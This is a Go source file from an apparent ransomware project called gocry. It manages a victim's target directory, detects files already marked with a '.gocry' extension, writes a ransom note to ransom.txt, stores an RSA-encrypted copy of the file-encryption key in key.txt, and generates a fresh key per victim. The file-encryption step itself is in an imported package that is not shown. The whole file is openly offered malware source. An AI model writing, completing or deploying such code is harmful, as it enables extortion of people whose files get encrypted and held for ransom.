package ransomware

import (
	"bytes"
	"errors"
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/nireo/gocry/crypt"
	"github.com/nireo/gocry/utils"
	"github.com/nireo/gocry/victim"
)

// Ransomware holds all the needed client information needed to go forward with the ransom.
type Ransomware struct {
	Key       []byte
	PublicKey string
	RootDir   string
	IP        string
	Data      *victim.VictimIndentifier
}

// CheckIfActiveRansom checks for any files with the .gocry extension such that then
// the ransomware knows not to re-ecrypt the files.
func (rw *Ransomware) CheckIfActiveRansom() error {
	if encrypted := checkIfEncrypted(rw.RootDir); encrypted {
		return errors.New("some files are already encrypted")
	}

	// check if ransom.txt and key.txt exists in the root directory.
	if _, err := os.Stat(rw.RootDir + "/key.txt"); !os.IsNotExist(err) {
		return errors.New("a key.txt already exists: " + err.Error())
	}

	if _, err := os.Stat(rw.RootDir + "/ransom.txt"); !os.IsNotExist(err) {
		return errors.New("a ransom.txt file already exists: " + err.Error())
	}

	return nil
}

// CreateTextFiles is responsible for creating the  ransom.txt. The message
// is taken as a parameter since it makes the main file look more clear and configurable.
func (rw *Ransomware) CreateRansomInfoFile(message string) error {
	file, err := os.Create(rw.RootDir + "/ransom.txt")
	if err != nil {
		return errors.New("could not create ransom.txt file: " + err.Error())
	}
	defer file.Close()

	if _, err := file.WriteString(message); err != nil {
		return errors.New("could not write message to file: " + err.Error())
	}

	return nil
}

func checkIfEncrypted(path string) bool {
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			if encrypted := checkIfEncrypted(path + f.Name()); encrypted {
				return true
			}
		} else {
			if strings.HasSuffix(f.Name(), ".gocry") {
				return true
			}
		}
	}

	return false
}

// WriteKeyFile takes in the ransomware's key and writes the rsa public key encrypted
// version of the key into a file called 'key.txt'
func (rw *Ransomware) WriteKeyFile() error {
	rsaEncryptedKey, err := crypt.EncryptKey(rw.Key, rw.Data.UUID)
	if err != nil {
		return err
	}

	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", rsaEncryptedKey, 0600); err != nil {
		return err
	}

	return nil
}

// RemoveKeyFile removes the generated key file which holds the decryption key to the
// encrypted files.
func (rw *Ransomware) RemoveKeyFile() error {
	if err := os.Remove(rw.RootDir + "/key.txt"); err != nil {
		return err
	}

	return nil
}

func (rw *Ransomware) CheckIfValidKey() bool {
	key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
	if err != nil {
		return false
	}

	if bytes.Equal(key, rw.Key) {
		return true
	}

	return false
}

// RemoveRansomFile removes the generated ransom file which notifies user that the computer
// is under ransom.
func (rw *Ransomware) RemoveRansomFile() error {
	if err := os.Remove(rw.RootDir + "/ransom.txt"); err != nil {
		return err
	}

	return nil
}

// NewRansomware creates a new ransomware instance given a starting directory.
// This function automatically generates a 32-bit encryption key to encrypt files.
func NewRansomware(toEncrypt string) (*Ransomware, error) {
	key, err := utils.Gen32BitKey()
	if err != nil {
		return nil, err
	}

	return &Ransomware{
		RootDir: toEncrypt,
		Key:     key,
		Data:    victim.NewVictimIndentifer(),
	}, nil
}
